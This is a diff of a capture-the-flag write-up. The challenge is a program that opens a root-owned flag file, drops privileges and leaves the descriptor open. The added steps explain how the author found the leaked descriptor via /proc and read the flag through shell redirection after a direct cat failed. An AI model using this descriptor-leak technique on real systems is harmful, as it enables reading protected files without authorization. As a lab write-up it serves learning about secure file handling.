@@ -105,11 +105,14 @@ Connected to terminal using:
 ```nc 13.235.21.137 4657```
 
 ls Gives: 
-```$ ls file_chal file_chal.c ``` 
+```
+$ ls 
+file_chal file_chal.c
+``` 
 
 Used cat to see the c script
 ```
-cat file_chal.c
+$ cat file_chal.c
 
 #include <fcntl.h>
 #include <unistd.h>
@@ -123,6 +126,8 @@ int main () {
     return 0; }
 ``` 
 
+We see that the code opens the flag before dropping the root privilage. The file is opened but not closed. So the file descriptor pointing to ```/root/flag``` is still valid.
+
 Then to see the file descriptors used:
 ``` 
 ls -l /proc/$$/fd
@@ -131,5 +136,16 @@ total 0 lrwx------ 1 ctf ctf 64 May 23 09:35 0 -> /dev/pts/24
 lrwx------ 1 ctf ctf 64 May 23 09:35 1 -> /dev/pts/24
 lrwx------ 1 ctf ctf 64 May 23 09:35 2 -> /dev/pts/24
 lr-x------ 1 ctf ctf 64 May 23 09:35 3 -> /root/flag
-
-$ $ cat /proc/$$/fd/3 cat: /proc/2285/fd/3: Permission denied $ head /proc/$$/fd/3 strings /proc/$$/fd/3 dd if=/proc/$$/fd/3 bs=1 count=100 head: cannot open '/proc/2285/fd/3' for reading: Permission denied $ sh: 11: strings: not found $ dd: failed to open '/proc/2285/fd/3': Permission denied $ read line <&3 echo "$line" $ PClub{4lw4ys_cl05e_y0ur_fil3s} ```
+```
+Then tried to cat fd 3:
+```
+$ $ cat /proc/$$/fd/3
+cat: /proc/2285/fd/3: Permission denied
+```
+We can't cat it directly. 
+But we are already in the same process that opened fd3, so tried shell redirection: Which gives us the flag.
+```
+$ read line <&3
+echo "$line"
+$ PClub{4lw4ys_cl05e_y0ur_fil3s}
+```
